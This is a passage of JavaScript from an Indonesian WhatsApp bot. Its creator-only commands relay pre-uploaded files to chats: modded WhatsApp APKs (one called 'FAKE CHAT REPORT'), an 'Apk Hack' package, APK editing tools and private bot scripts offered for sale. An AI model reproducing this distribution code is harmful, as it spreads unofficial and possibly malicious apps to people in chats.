"fileEncSha256": "ngqg7NXELMylExItJSx6yCR/WLvwgE30Uaz7ffHoFI8=",
"directPath": "/v/t62.7119-24/13763860_152939334171740_6756609789846514582_n.enc?ccb=11-4&oh=01_AdRZvTl3Xq_P81_gLahjaLXv7_mJaci-yB3IbHIrDhvlFA&oe=63E22966",
"mediaKeyTimestamp": "1673183311",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim Apk Hack 
Versi Code : 1
Size        : 1.74M
Versi       : 1.0
Packages   : com.KingPOD
Tanda Tangan : V1
`)
}
break


case 'drawany': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AklJg686fzI63k4lbOZgvMaLcuxKQZ1NSAW7O02aqawv.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "DrawAnyWhere_4.3.5.apk",
"fileSha256": "cjySNM1YyrZbA2tAoetGiPqU7XBzqpks+5Y2SRTjMcg=",
"fileLength": "2009356",
"pageCount": 0,
"mediaKey": "HX2pvy38n9X0ujV4+SYemjWw2niMxp4MIZqrPdEppbU=",
"fileName": "DrawAnyWhere_4.3.5.apk",
"fileEncSha256": "QDqHaBRpJ/fLIyMNgzVWjVVN2/5pjnofi1CSzjVES7E=",
"directPath": "/v/t62.7119-24/30957615_1511635945979743_5505496555941343278_n.enc?ccb=11-4&oh=01_AdTZ49WMm8qqcOPsZYih0CGlC30xDjTpOckfyHhWomAY8g&oe=63E2480F",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim Apk
Versi Code : 32
Size        : 1.92M
Versi       : 4.3.5
Packages   : com.mlwrkz.drawanywhere
Tanda Tangan : V1 + V2
`)
}
break



case 'drawany1': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlMM1DkKHYH55ERlK5b8T-cpbuGTEvd1S8Q25cnVBcyW.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Ascii Art_4.0.4.apk",
"fileSha256": "M+2NfEbgTJPO0WVBIYU1/6Wc/v7pw2XTsCZBrQbLdzk=",
"fileLength": "3466685",
"pageCount": 0,
"mediaKey": "3pE02PDFQJ8V73OraB3sJVNCSgQk9HCfaeqBGY5ITq4=",
"fileName": "Ascii Art_4.0.4.apk",
"fileEncSha256": "at/92MJZp856mqiwp+scL0CiJ9RhJ36+So6w3fhyLRY=",
"directPath": "/v/t62.7119-24/35201011_1354414975318864_8414635329800543416_n.enc?ccb=11-4&oh=01_AdQi7TD1lhrqskdiiWfMTg4lpCWJXF0bprYyY5kXGm43_g&oe=63E221F7",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim Apk
Versi Code : 404
Size        : 3.31M
Versi       : 4.0.4
Packages   : com.duy.asciiart
Tanda Tangan : V1 + V2
`)
}
break


case 'drawany2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqrqODyWUVMT_RcTxIK9SHnOAh2veq1ubsWvJet3zoGv.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "APK Editor_3.0.apk",
"fileSha256": "6f8mXks3saLFgQYBvycLn1bRDM0/FEnxxmwK7Q+bpXY=",
"fileLength": "5528152",
"pageCount": 0,
"mediaKey": "eBOaFSzeSU4ZmnGZuXs5SfRYKizhO+XW/AekUiXcij4=",
"fileName": "APK Editor_3.0.apk",
"fileEncSha256": "8i68nLN0qJ7WPbt2QdTsTcD8HRdGw0c+CuY1NgK0WFw=",
"directPath": "/v/t62.7119-24/30024119_2472137919604014_2433576390214876562_n.enc?ccb=11-4&oh=01_AdQ9HjFuka0LVhusUvcr8swpOSmqQoRrOqAoP9LBpH6TzQ&oe=63E2290B",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim Apk
Versi Code : 300
Size        : 5.27M
Versi       : 3.0
Packages   : com.gmail.heagoo.apkeditor.pro
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'drawany3': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AovKeLfmxDfnq1N4wnXZqYhht7eDWW1IJzBU892qt4-w.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "MT Manager_2.11.3.apk",
"fileSha256": "8MVrLc1vQHhGjRmeoxtsja11AXW0H/WTq/noKp+FF/o=",
"fileLength": "19646480",
"pageCount": 0,
"mediaKey": "E+JoXBl2rW0ZZXno4FTi07CMeZ+0tj4MymCOQhDdT2A=",
"fileName": "MT Manager_2.11.3.apk",
"fileEncSha256": "58M7+bXYn2WfYISmU5xrp+jjYyT90xRCrPotBhwysrE=",
"directPath": "/v/t62.7119-24/29231642_217221087373927_1255336424081941846_n.enc?ccb=11-4&oh=01_AdTlpDi0w3wwiBsZHhvizOERjbvNakpI9x_lEJwEBTYHOw&oe=63E21A47",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim Apk
Versi Code : 22071591
Size        : 18.74M
Versi       : 2.11.3
Packages   : bin.mt.plus
Tanda Tangan : V1 + V2
`)
}
break


case 'wonggbb': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/ApXbcz1gxrI6p55OfAM-ZrQkxfM23L5OdUwIoChfI6EI.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "GBWA+FAKE CHAT REPORT.apk",
"fileSha256": "5p+kjZtCblhSwD4PI8alhuaU7Ef7bR/mz2VEk9yJSyU=",
"fileLength": "61592469",
"pageCount": 0,
"mediaKey": "XOYtOKs7931zEwF5jSzU+QUoWW6h3FglrHambltnvDc=",
"fileName": "GBWA.apk",
"fileEncSha256": "l8qUD/DxduackJL+aVBy/lhDrmVI68/Lhch+X0VhUzo=",
"directPath": "/v/t62.7119-24/31979775_547821587361656_1119496716832352749_n.enc?ccb=11-4&oh=01_AdSP1OHQIt_exuK06AYY1j-UdFVk3-NHfgALuCGkql1bVg&oe=63E21F07",
"mediaKeyTimestamp": "1673181141",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size        : 58.74M
Versi Wa   : 2.22.17.76
Packages   : com.gbwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break


case 'wonggb': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AnyLA2cmhJyWHBvJRf0O1mnYNFMbru2AXb9WrGVk0A1Z.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77.apk",
"fileSha256": "orFUyKb7toZfE0T6fBIl56h3AI1Q/Yw6/VJVDox8w48=",
"fileLength": "62057577",
"pageCount": 0,
"mediaKey": "0zCmtzm2+v7r7mqdAmqQ2YSiLy9CixpEoW0q1+dNgLs=",
"fileName": "Fix BWhatsApp_2.22.23.77.apk",
"fileEncSha256": "JW81e8yD8yRoNV/dMB7m3hr9o/aWfEad0CAE66dOwDs=",
"directPath": "/v/t62.7119-24/35261867_631466192085771_3320560928032684188_n.enc?ccb=11-4&oh=01_AdRMM2krCyNqxruyk2MhiJkGde6VlEXPJUqN6KZ4RO544g&oe=63DE076F",
"mediaKeyTimestamp": "1672903280",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size        : 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.gbwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break
case 'wonggb1': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Au9ttoukIuYGJHDDVhMEWynwfMbA0I25TuEt-6VXaIBJ.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.hwmodswa].apk",
"fileSha256": "RINlspgKYPFwow9txHRyvmTVE1naSeEP7tiBRaVgocg=",
"fileLength": "62004337",
"pageCount": 0,
"mediaKey": "KCYRg9ga6W+ucscnud404KVMBQgPb3Torka5gKwZxqQ=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.hwmodswa].apk",
"fileEncSha256": "Mz4AumgNwH8PAEYfudoNvsMurd5aV3HD6wDgxjGdAVY=",
"directPath": "/v/t62.7119-24/29336596_492043203071081_6910390125030767965_n.enc?ccb=11-4&oh=01_AdTxzAaHnuX8SwuHtmmvqeTIzMMlyyL4oTSqp8801dQquA&oe=63E2438D",
"mediaKeyTimestamp": "1673181587",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size        : 58.74M
Versi Wa   : 2.22.17.76
Packages   : com.hwmodswa
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'wonggb2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AoOuBafurPVmYtwlGihGWbUVvUniEAJ0WYblt2tQKenR.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.hwwhatsapp].apk",
"fileSha256": "2yIDjRuRKFZKeLmMzXH+CbGR9GCRAjf5zy5ksNsuzQ0=",
"fileLength": "62004338",
"pageCount": 0,
"mediaKey": "qFWirI+1LvxWjoQ9CuOGdt25FywyGwq9FeMeJfXiJy8=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.hwwhatsapp].apk",
"fileEncSha256": "e8zq+b92Mid4kqqyHjQqTvn8kSZai3PXfg0j5hAZ/do=",
"directPath": "/v/t62.7119-24/21582267_234176845613728_4154839308800527485_n.enc?ccb=11-4&oh=01_AdT48UUWQhBkm6BpgHMR3PyvUQu_5CE1W_GLZS-Jma_7wg&oe=63E227C7",
"mediaKeyTimestamp": "1673181942",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size        : 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.hwwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break
case 'wonggb3': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AvvsiskTlOschzcEV-n8Empd-D8rTQS-udZyqDDcAmjs.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.wago].apk",
"fileSha256": "7s8HyZWnR/1UhXbnzz1FAMVCzCKzJah0MBXSKbovjFE=",
"fileLength": "61992052",
"pageCount": 0,
"mediaKey": "cZ2KbQP9oLb5+LB+xsAPCk4ugXY095C4+nuKIVqVYZ4=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.wago].apk",
"fileEncSha256": "cRwxyP6wpe9g3gh8oTxFyRH+8+chSXj5cZnYsyhcWn4=",
"directPath": "/v/t62.7119-24/40697900_1132286054114597_6407413577873705490_n.enc?ccb=11-4&oh=01_AdS6JwsUp3cd1pH8Qi_nFaUOYF0US2HeGms9-OaiOF3eew&oe=63E21CC8",
"mediaKeyTimestamp": "1673062140",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size        : 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.wago
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'wonggb4': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Arl_PeGyn9cA4WwergChqs-ai7RxJgcmn51lygZMSFLw.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.whatsapp].apk",
"fileSha256": "oD2F2McuaTuHLHM24qwrBUxzZPT0nuw0Ffgt/zM6Iis=",
"fileLength": "62000240",
"pageCount": 0,
"mediaKey": "KY+yHyslMUGzPPLwgc+bRHvf/XoKdOV8w0cZh2Naht8=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.whatsapp].apk",
"fileEncSha256": "sGUEsIGepkr7U9526ie0CtgjB1o6IeQLoTTbVulGQ7Y=",
"directPath": "/v/t62.7119-24/33538326_4570455823079139_5863659581296623888_n.enc?ccb=11-4&oh=01_AdTGp3LzY8rK87kWiUw3XCvsQKVgrMz40JYtaWTrZTA9iA&oe=63E21DD7",
"mediaKeyTimestamp": "1673181942",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size        : 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.whatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'hwcap': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlClDGiDLNkIQFVxIQ-kAGZ8vOp63lrN2AkoKDeRNRL9.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.gbwhatsapp.apk",
"fileSha256": "s13/oODB78/58X257unjAwsXf4LLeULGp/l++c+uu7w=",
"fileLength": "43515737",
"pageCount": 0,
"mediaKey": "+zfXSe1Xyi59ehOXTFbT4Vob1z3qfhzrQoJYryFzo+o=",
"fileName": "com.gbwhatsapp.apk",
"fileEncSha256": "HS5o73SZdzpGgFC2wk7zVOIfC/aqEEb6R7KDZxa+ics=",
"directPath": "/v/t62.7119-24/32323647_1704522319943063_7268744727360475273_n.enc?ccb=11-4&oh=01_AdTfiFnWCo_tG9aLOmNkA7RjIBcXLvma8JeW5yEbEN4iqg&oe=63DB9E35",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size        : 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.gbwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break



case 'hwcap1': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/As0gmHsInIy6e6UPYjrNiigS0hlDosyoIaMy4zMqdjkN.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.whatsapp.apk",
"fileSha256": "I0xnpnLeheqy/+ffFvsVRPjaNqtRMyshm1PBKNyZkMM=",
"fileLength": "43515735",
"pageCount": 0,
"mediaKey": "I4hcPhyQAceElP1Bwib4VKEuRSwhmNAsFF3FofLs5yo=",
"fileName": "com.whatsapp.apk",
"fileEncSha256": "Y5g/cazDY49sFl72yHUr5J2sJvOTXrCEEcio+Ms15wM=",
"directPath": "/v/t62.7119-24/25248586_1481423949032257_8662275218785410107_n.enc?ccb=11-4&oh=01_AdTQ15Pq-s4OP2a9fv47ZOedXOx1hqQf1gDzz0Tz8QQKWQ&oe=63DB98CF",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size        : 41.51M
Versi Wa   : 2.23.1.11
Packages   : com.whatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break


case 'hwcap2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AmeZ6Zpaqw1FmQgFAFd2tVKPoojkzNm0kmnUEaZQ63ff.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.hwmodswa.apk",
"fileSha256": "s52EF7fQYPi61BC8QKm3HjDywbjOC+8saE02ZoYNEHE=",
"fileLength": "43515737",
"pageCount": 0,
"mediaKey": "zCJO443XEt46OwSwcl6mOvVg3awBcQlFgrqUGcSpMvY=",
"fileName": "com.hwmodswa.apk",
"fileEncSha256": "8mgWerVQlnLcKPBCtZAkCqYpMznRoBjb8uoLqVopFFg=",
"directPath": "/v/t62.7119-24/25529407_1424674921695790_2054483089005385603_n.enc?ccb=11-4&oh=01_AdRwDo1ZhGIoOzaW5nVZJTIWJRy7gpKrcZBSLt0owv4obA&oe=63DB9916",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size        : 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.hwmodswa
Tanda Tangan : V1 + V2 + V3
`)
}
break




case 'hwcap3': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AteXrYtIveEthnvpwdfoG2Wx1fdVQM6PZ3yF4U4OjhK7.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.privatehwmods.apk",
"fileSha256": "BqIOKqV9EANJ1DMaqHG5zY285fclOCqYbx82a1HJoSA=",
"fileLength": "43515733",
"pageCount": 0,
"mediaKey": "eE70/Y8gkFydbnUa7MC6QVJGRaNOyjwXb4eJdPNnHCI=",
"fileName": "com.privatehwmods.apk",
"fileEncSha256": "gCArAKb/bhhj/mbW1lRyb5n9HuvzE7DrzSMjA7Z4efk=",
"directPath": "/v/t62.7119-24/56019076_142608418616022_7634680365294243285_n.enc?ccb=11-4&oh=01_AdQLRLfDtsJhvYEKvEusnT5LYOTHEEfCNkxeQeC71LqVDA&oe=63DB9CD4",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size        : 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.privatehwmods
Tanda Tangan : V1 + V2 + V3
`)
}
break



case 'hwcap4': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AuguiTpeWe4B7f--920G_3BRXrQ5mxYdb_7Mo1G7ErRt.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.wago.apk",
"fileSha256": "479poOq9WRN6+OHthWXsRgyDT3easdvW5NjUmrlFMig=",
"fileLength": "43515734",
"pageCount": 0,
"mediaKey": "9NF53WHjcHNHS0gRaWciF/YfDxWw4laREdd6rdp1hiU=",
"fileName": "com.wago.apk",
"fileEncSha256": "LhRhDeOo36rEzR36xK9AM4ABFzfPBQryr6pEDAYbbis=",
"directPath": "/v/t62.7119-24/55680376_1826485511055382_512259021203785243_n.enc?ccb=11-4&oh=01_AdQB-PYzelluYHBSgjbMhuyzFU8g1upO9fxkUrPBrF3j4A&oe=63DB900E",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size        : 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.wago
Tanda Tangan : V1 + V2 + V3
`)
}
break





case 'hwcap5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AkUEPTZZVTHsUe7-XtNfGgSXsfUWBgH1obpy8KIZgHyx.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.hwwhatsapp.apk",
"fileSha256": "WHKKZOEkYFXr9Qg63O6ynzTaO19bVQFis/vWZ/EcUOw=",
"fileLength": "43515733",
"pageCount": 0,
"mediaKey": "ooOMGfhy/7KG7VF9XRBhnvBg1iX47MuDzFldE//C3k0=",
"fileName": "com.hwwhatsapp.apk",
"fileEncSha256": "vcOpbu1cnI6RhauCyVEhIAKqMBmvqY34+nL//2n9nIA=",
"directPath": "/v/t62.7119-24/30549695_5139404179494774_4648086889572207755_n.enc?ccb=11-4&oh=01_AdRgECyJ5L7pEbRQ6gQImiq3nhZqJ8QLGqpOuOyB_jZPZg&oe=63DBA58E",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN Casper SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size        : 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.hwwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break


case 'skripp': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"documentMessage": {
					"url": "https://mmg.whatsapp.net/d/f/Av_nK1cM46OjbKbEQmAvYIeOneFuuiUwu1_w7BxsZP4e.enc",
					"mimetype": "application/zip",
					"title": "PRIVATE BOT.zip",
					"fileSha256": "UkOmayhSfQt1aOAgxNqBWno8N2cirtE/O8KP+7mKSXU=",
					"fileLength": "16217374",
					"pageCount": 0,
					"mediaKey": "7td+r+ec86FtPrIlXRVHvUFMkbdGYf8lVqScKtK+Su8=",
					"fileName": "PRIVATE BOT.zip",
					"fileEncSha256": "7mLlQ2DsNQ2nXgK6Uvs0ixZLfvNU+SzKP8ZZVaYm4d8=",
					"directPath": "/v/t62.7119-24/20119310_698104731756392_1260733528298636685_n.enc?ccb=11-4&oh=01_AdRS-9woib7a5Xtj0LcvJwRmllC4K95meX9q5iUvOhhKSQ&oe=63E29E81",
					"mediaKeyTimestamp": "1673214776",
"caption": "HELLO KAK SKRIP INI SUDAH PULIHKAN SEPENUHNYA SELF DAN TIDAK NYA SUDAH SAYA SETTINGS",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply('sukses Kirim Script Bot Private')
}
break

case 'skrip': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Au2uATA9cWNPMtwqNU69F0QAI6GLFkFT-gjxliJHfKzJ.enc",
"mimetype": "application/zip",
"title": "Bot Group.zip",
"fileSha256": "AhBtbWZK/AP+jlL0EiMvXpj1N8I9Sd3BrFXlm9xDwSI=",
"fileLength": "11571175",
"pageCount": 0,
"mediaKey": "NxTFI4rRHZgW/WaQAoVHBp+5POXecHwgbw/gWbw/0/I=",
"fileName": "Bot Group.zip",
"fileEncSha256": "g4EAdniYVnAmL2J5ZFFykuRSh9Gs6ROIHj6sxYw7+1w=",
"directPath": "/v/t62.7119-24/41066349_1226230384632329_1641739652445545297_n.enc?ccb=11-4&oh=01_AdSi5_5TpF1vkWHEAHOPTJdlDnQ6KMWV2WvDRbo_8VpioA&oe=63D623AE",
"mediaKeyTimestamp": "1672396134",
"caption": "HELLO KAK SKRIP INI SUDAH PULIHKAN SEPENUHNYA SELF DAN TIDAK NYA SUDAH SAYA SETTINGS",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
reply('sukses Kirim Script')
}
break
//=================================================//
case 'jualan': case 'shop': {
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`
⊱𝚂𝙷𝙾𝙿 𝙼𝙴𝙽𝚄
┏━━⊱
┣⊱ Panel
┣⊱ Script
┣⊱ WhatsApp
┣⊱ Pulsa
┗━━━━⊱`)
}
break
//=================================================//
case 'whatsapp': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Untuk Harga Custom WhatsApp 50k Boleh Request Fitur Tampilam Nama Dan Logo Yah Hub: wa.me/62882003133773`)
}
break
//=================================================//
case 'nodemodules': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
